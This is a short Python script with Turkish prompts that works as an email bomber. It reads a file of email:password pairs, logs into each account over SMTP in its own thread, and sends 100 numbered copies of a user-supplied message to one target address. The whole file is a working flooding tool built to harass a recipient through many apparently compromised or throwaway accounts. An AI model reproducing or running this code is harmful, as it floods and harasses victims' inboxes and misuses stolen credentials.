import yagmail, threading
to = input("Hedef Mail'i Giriniz: ")
subject = input("Konuyu Giriniz: ")
contents = input("Mesaj İçeriğini Giriniz: ")
def gonder(email,sifre):
    sayi1 = 0
    mail = yagmail.SMTP(email, sifre)
    while True:
        sayi1 += 1
        mail.send(to=to, subject=subject+str(sayi1), contents=contents)
        print("Gönderildi!", sayi1)
        if sayi1 == 100:
            break

file_name = input("Email Ve Şifrenin Çekileceği Dosya İsmini Giriniz: ")
a = open(file_name, mode="r").readlines()
for i in a:
    cut = i.split(":")
    try:
        th1 = threading.Thread(target=gonder, args=(cut[0], cut[1]))
        th1.start()
    except:
        continue
